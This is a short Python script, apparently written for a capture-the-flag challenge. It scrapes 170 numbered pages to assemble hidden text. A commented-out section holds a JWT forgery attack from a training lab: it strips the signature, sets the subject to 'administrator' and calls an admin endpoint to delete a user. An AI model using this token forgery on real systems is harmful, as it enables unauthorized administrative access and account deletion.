#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote
import jwt
import base64


url = "https://digitaldragonsctf-everything-at-once.chals.io/"
data_all = ""
# response = requests.get( url  + str(1) + ".html", verify=False)
# print(response.text)
for i in range(170):
    response = requests.get(url  + str(i) + ".html", verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    data = soup.find('h1').text
    data_all += data
print(data_all)
# data = {
#     'csrf': csrf,
#     'username': 'wiener',
#     'password': 'peter',
# }

# response = session.post(
#     url + '/login',
#     data=data,
#     verify=False,
#     allow_redirects=False,
# )

# token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]

# decode_token = jwt.decode(token, options={"verify_signature":False})
# print(f"Decode token: {decode_token}\n")

# decode_token['sub'] = 'administrator'
# print(f"Modified payload : {decode_token}\n")

# modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
# print(f"Modified token : {modified_token}\n")

# session_data = modified_token
# cookies = {
#     'session' : session_data,

# }

# response = requests.get(
#     url + '/admin/delete?username=carlos',
#     cookies=cookies,
#     verify=False,
# )

# soup = BeautifulSoup(response.text,'html.parser')
# print(soup)
